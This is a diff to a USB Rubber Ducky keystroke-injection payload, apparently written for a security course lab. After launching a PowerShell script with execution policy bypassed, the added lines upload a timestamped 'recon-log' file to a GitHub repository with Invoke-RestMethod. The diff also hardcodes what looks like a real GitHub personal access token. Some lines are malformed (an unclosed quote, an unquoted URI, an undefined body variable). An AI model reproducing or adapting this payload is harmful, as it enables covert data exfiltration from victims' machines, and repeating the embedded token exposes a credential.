@@ -27,3 +27,22 @@ DELAY 1500
 
 STRING powershell -NoProfile -ExecutionPolicy Bypass -File $p -DuckyDrive $dir
 ENTER
+
+REM GitHub token and headers
+STRING $token = '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'
+ENTER
+STRING $headers = @{ Authorization = "token $token" };
+ENTER
+
+STRING $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss";
+ENTER
+STRING $filename = "recon-log-$timestamp.txt
+ENTER
+
+REM Set URI
+STRING $uri = https://api.github.com/repos/butlersl/305-lab-files/Recon-Payload/" + $filename;
+ENTER
+
+REM Upload to github
+STRING Invoke-RestMethod -Uri $uri -Method PUT -Headers $headers -Body $body;
+ENTER
